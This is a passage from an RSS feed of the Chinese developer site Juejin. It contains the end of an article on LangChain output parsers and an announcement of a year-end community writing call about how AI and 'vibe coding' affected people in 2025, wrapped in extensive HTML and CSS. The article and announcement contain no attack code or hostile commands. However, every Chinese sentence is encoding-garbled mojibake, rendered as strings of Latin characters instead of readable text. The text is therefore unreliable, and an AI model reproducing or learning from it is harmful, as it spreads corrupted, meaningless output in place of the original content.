<li><code>PydanticOutputParser</code>ï¼šè¿”å› Pydantic å®ä¾‹å¯¹è±¡ï¼›</li>
<li><code>JsonOutputParser</code>ï¼šè¿”å›æ ‡å‡† JSON æ ¼å¼ï¼›</li>
</ul>
</li>
<li>
<p><strong>é”™è¯¯å¤„ç†</strong>ï¼šè‹¥å¤§æ¨¡å‹è¾“å‡ºä¸ç¬¦åˆè§£æå™¨è¦æ±‚ï¼Œä¼šç›´æ¥æŠ›å‡ºè§£æé”™è¯¯ï¼Œéœ€ä¼˜åŒ–æç¤ºæ¨¡æ¿æˆ–æ¨¡å‹å‚æ•°ã€‚</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ†2025 AI/Vibe Coding å¯¹æˆ‘çš„å½±å“ | å¹´ç»ˆå¾æ–‡]]></title>    <link>https://juejin.cn/post/7587675443442450472</link>    <guid>https://juejin.cn/post/7587675443442450472</guid>    <pubDate>2025-12-26T03:04:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7587675443442450472" data-draft-id="7586836874016751626" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ†2025 AI/Vibe Coding å¯¹æˆ‘çš„å½±å“ | å¹´ç»ˆå¾æ–‡"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-26T03:04:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘é…±"/> <meta itemprop="url" content="https://juejin.cn/user/1556564194374926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ†2025 AI/Vibe Coding å¯¹æˆ‘çš„å½±å“ | å¹´ç»ˆå¾æ–‡
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/7255271989291450420/posts" data-v-d326b38e=""><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7b3e5e62bb3a4eff89269d51825c4a1f~tplv-k3u1fbpfcp-watermark.image?" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/7255271989291450420/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="æ˜é‡‘è¿è¥å›¢é˜Ÿ" class="title" data-v-d326b38e="">æ˜é‡‘è¿è¥å›¢é˜Ÿ</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2025-12-26T03:04:16.000Z" title="Fri Dec 26 2025 03:04:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2025-12-26
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                2,203
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                é˜…è¯»6åˆ†é’Ÿ
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        å…³æ³¨
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              â¤é¦–å¸­å®¢æœå› @æ˜é‡‘
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d4ef939034d4f9e8f6f5798c339e98d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596627&amp;x-signature=mayR18zxXzSlm2yaTK1VlMrodrs%3D" alt="img_v3_02t9_51022880-c5f3-4f3c-8892-b6f6ca1ba8eg.png" loading="lazy"/></p>
<p>å½“å²æœ«çš„é’Ÿå£°ä¸´è¿‘ï¼Œæˆ‘ä»¬åˆç«™åœ¨äº†ä¸€å¹´çš„é‡ç‚¹å›æœ›ã€‚2025å¹´ï¼Œå¯¹ä½ è€Œè¨€ï¼Œæ˜¯æ€æ ·çš„è½®å»“å‘¢ï¼Ÿ</p>
<p>å®ƒæˆ–è®¸æ˜¯ç”±ä¸€è¡Œè¡Œè¢«AIé‡æ„çš„ä»£ç å‹¾å‹’ï¼Œæ˜¯æŸä¸ªæ·±å¤œä¸æ–°æŠ€æœ¯â€œé¡¿æ‚Ÿæ—¶åˆ»â€çš„çµå…‰ä¸€ç°ï¼Œä¹Ÿå¯èƒ½æ˜¯ç”Ÿæ´»ä¸­å› ä¸ºæ™ºèƒ½ä½“å·¥å…·è€Œæ‚„ç„¶æ”¹å˜çš„å·¥ä½œçŠ¶æ€ã€‚</p>
<p>ä»æ™ºèƒ½ä½“ï¼ˆAgentï¼‰çš„æ¨ªç©ºå‡ºä¸–åˆ°å¤šæ¨¡æ€æŠ€æœ¯çš„ç»éªŒçªç ´ï¼ŒæŠ€æœ¯æ„ˆåŠ æ·±å…¥åœ°æµæ·Œå°½æˆ‘ä»¬çš„å·¥ä½œå’Œç”Ÿæ´»æ—¥å¸¸ï¼Œå¡‘é€ ç€å±äºæ¯ä¸ªäººçš„ç‹¬ç‰¹â€œVibeâ€ã€‚</p>
<p>ä»Šå¤©ï¼Œç¨€åœŸæ˜é‡‘æ­£å¼å‘èµ·è¿™åœºä¸“å±ç¤¾åŒºçš„<strong>å¹´ç»ˆâ€œå›´ç‚‰å¤œè¯â€</strong> ï¼Œæˆ‘ä»¬ä¸è°ˆå®å¤§çš„è¡Œä¸šé¢„è¨€ï¼Œä¸è®¾è‹›åˆ»çš„è¯„å®¡æ¡†æ¶ã€‚æˆ‘ä»¬åªæƒ³é‚€è¯·æ‚¨ï¼Œè®°å½•ä¸‹å±äºä½ çš„æ•°å­—å¹´è½®ã€‚</p>
<h2 data-id="heading-0">âœ¨ä¸»é¢˜ ï¼š2025 AI/Vibe Codingå¯¹æˆ‘çš„å½±å“</h2>
<p>æœ¬æ¬¡å¾æ–‡ä¸å†æ˜¯ä¸€åœºç«èµ›ï¼Œè€Œæ˜¯ä¸€æ¬¡ç¤¾åŒºçš„å¹´ç»ˆâ€œå›´ç‚‰å¤œè¯â€ã€‚æˆ‘ä»¬é¼“åŠ±æ‰€æœ‰æˆå‘˜åœä¸‹è„šæ­¥ï¼Œå›æœ›2025å¹´æŠ€æœ¯ä¸ä¸ªäººç”Ÿæ´»äº¤ç»‡çš„ç—•è¿¹ã€‚æ— è®ºæ˜¯ä»£ç ä¸–ç•Œçš„æ·±åˆ»å˜é©ï¼Œè¿˜æ˜¯AIå·¥å…·å¸¦æ¥çš„ç»†å¾®ä¹ æƒ¯æ”¹å˜ï¼Œæ¯ä¸€æ¬¡è®°å½•ï¼Œéƒ½æ˜¯æˆ‘ä»¬å…±åŒçš„â€œæ•°å­—å¹´è½®â€ã€‚</p>
<h2 data-id="heading-1">â‰ï¸å¦‚ä½•å‚ä¸</h2>
<p>å‘å¸ƒæ–‡ç« æ—¶é€‰æ‹©å¸¦è¯é¢˜ <strong><a href="https://juejin.cn/theme/detail/7586482726807535666?contentType=1" target="_blank" title="https://juejin.cn/theme/detail/7586482726807535666?contentType=1">#2025 AI/Vibe Coding å¯¹æˆ‘çš„å½±å“#</a></strong> å°±å¯ä»¥è¢«ç»Ÿè®¡åˆ°å“¦ğŸ’ğŸ»</p>
<p align="left"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a9b3efe1391432e9d11a481dc69d654~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596627&amp;x-signature=rt%2BiTIribYx4TYlPyX0PNn471R8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">ğŸ—’ï¸èµ›é“è¯´æ˜</h3>
<p><code>å‚ä¸è€…å¯ä»¥ä»»é€‰å…¶ä¸€è¿›è¡ŒæŠ•ç¨¿ï¼Œä¹Ÿå¯åŒæ—¶å‚ä¸ï¼Œä¸é™åˆ¶æŠ•ç¨¿æ–‡ç« æ•°ã€‚</code></p>
<h4 data-id="heading-3">èµ›é“ä¸€ï¼š2025ï¼Œæˆ‘çš„â€œVibe Codingâ€æ—¶åˆ»</h4>
<blockquote>
<p><strong>ä¸»é¢˜è§£è¯»</strong></p>
<p>èšç„¦æŠ€æœ¯<strong>å¯¹â€œæˆ‘â€çš„ä¸ªä½“å½±å“</strong>ã€‚å¯ä»¥æ˜¯ä¸€ä¸ªAIå·¥å…·ã€ä¸€ä¸ªå¼€æºé¡¹ç›®ã€ä¸€æ¬¡æŠ€æœ¯å†³ç­–ã€ä¸€ç§è¡Œä¸šè¶‹åŠ¿ï¼Œä¹Ÿå¯ä»¥æ˜¯æŠ€æœ¯å¸¦æ¥çš„æŸç§ç”Ÿæ´»æ–¹å¼ã€‚</p>
<p><strong>å†…å®¹æ–¹å‘å»ºè®®</strong></p>
<ul>
<li><em>Agenté©å‘½</em></li>
</ul>
<p>ChatGPT/Geminiå¦‚ä½•æ”¹å˜æˆ‘çš„å¼€å‘æ•ˆç‡ï¼Œå¤§æ¨¡å‹å¦‚ä½•è®©æˆ‘çš„ä»£ç å¦‚é±¼å¾—æ°´ï¼Ÿï¼ˆæŠ€æœ¯å†²ç ´å¯¹å·¥ä½œæ¨¡å¼/æ•ˆç‡å¸¦æ¥çš„å½±å“ï¼Œä»»æ„æ¨¡å‹/æŠ€æœ¯çš†å¯ï¼‰</p>
<ul>
<li><em>ç”Ÿæ´»Vibe</em></li>
</ul>
<p>Web3ã€æ•°å­—æ¸¸æ°‘ç­‰æ¦‚å¿µå¼€å¯çš„æ–°ç”Ÿæ´»å°è¯•ï¼Œåˆ†äº«è‡ªå·±ç”¨AIç”Ÿæˆæ—…è¡Œæ”»ç•¥ã€åˆ›ä½œéŸ³ä¹ã€è¾…å¯¼å­©å­å­¦ä¹ çš„æ•…äº‹ç­‰ï¼›</p>
<ul>
<li><em>å¹´åº¦æ€»ç»“</em></li>
</ul>
<p>ä»¥ä¸ªäººè§†è§’ï¼Œå¤ç›˜ä½ åœ¨æŸä¸ªæŠ€æœ¯é¢†åŸŸï¼ˆå‰ç«¯ã€åç«¯ã€AIã€è¿ç»´ç­‰ï¼‰æˆ–è€…ç”Ÿæ´»ä¸Šè¿™ä¸€å¹´çš„å¾—å¤±ä¸è§‚å¯Ÿã€‚</p>
</blockquote>
<h4 data-id="heading-4">èµ›é“äºŒï¼šã€Œæˆ‘å’ŒTRAEçš„è¿™ä¸€å¹´ã€</h4>
<blockquote>
<p><strong>ä¸»é¢˜è§£è¯»</strong></p>
<p>ä¸€ä¸ªé’ˆå¯¹TRAEçš„ä¸“å±å›å¿†å½•ï¼Œè®°å½•æ˜é‡‘ç¤¾åŒºTRAEæ·±åº¦ç”¨æˆ·ä¸å…¶å…±åŒæˆé•¿çš„æ•…äº‹ã€‚</p>
<p><strong>å†…å®¹æ–¹å‘å»ºè®®</strong></p>
<ul>
<li><em>æˆé•¿è§è¯</em></li>
</ul>
<p>è®°å½•è‡ªå·±ä½¿ç”¨TRAEå®Œæˆçš„ç¬¬ä¸€ç¯‡æ–‡ç« ã€ç¬¬ä¸€ä¸ªè·èµã€ç¬¬ä¸€æ¬¡å‚ä¸å¼€æºé¡¹ç›®ã€ç¬¬ä¸€æ¬¡å¼€å‘çš„æ¸¸æˆç­‰ï¼›</p>
<ul>
<li><em>è¿æ¥æ•…äº‹</em></li>
</ul>
<p>é€šè¿‡ç¤¾åŒºæ‰€ç»“è¯†åˆ°çš„å¿—åŒé“åˆçš„TRAEå‹ã€å‚ä¸çš„çº¿ä¸‹/çº¿ä¸Šæ´»åŠ¨ã€ä¸TRAEå®˜æ–¹è¿è¥äº’åŠ¨çš„æœ‰è¶£ç¬é—´ï¼›</p>
<ul>
<li><em>äº§å“å…±å»º</em></li>
</ul>
<p>å¯¹TRAEåŠŸèƒ½æå‡ºçš„å»ºè®®è¢«é‡‡çº³ï¼Œæˆ–ä½¿ç”¨å„ä¸ªæ¨¡å¼æå‡å­¦ä¹ æ•ˆç‡çš„çœŸå®ä½“éªŒç¬é—´ã€‚</p>
</blockquote>
<p><em>â—å‚åŠ <strong>èµ›é“äºŒ</strong> çš„æ–‡ç« é™¤è¯é¢˜ <a href="https://juejin.cn/theme/detail/7586482726807535666?contentType=1" target="_blank" title="https://juejin.cn/theme/detail/7586482726807535666?contentType=1">#2025 AI/Vibeå¯¹æˆ‘çš„å½±å“</a> å¤–ï¼Œ<strong>å¿…é¡»åŠ ä¸Š<a href="https://juejin.cn/tag/Trae" target="_blank" title="https://juejin.cn/tag/Trae">#TRAE</a>æ ‡ç­¾</strong>ã€‚</em></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dca9a88a7ebd4c19ae7aa71c7101ef44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596627&amp;x-signature=4G2CVnQUGkVRBD2yVg92hFLmbe4%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">â˜ï¸å¾æ–‡è¦æ±‚</h3>
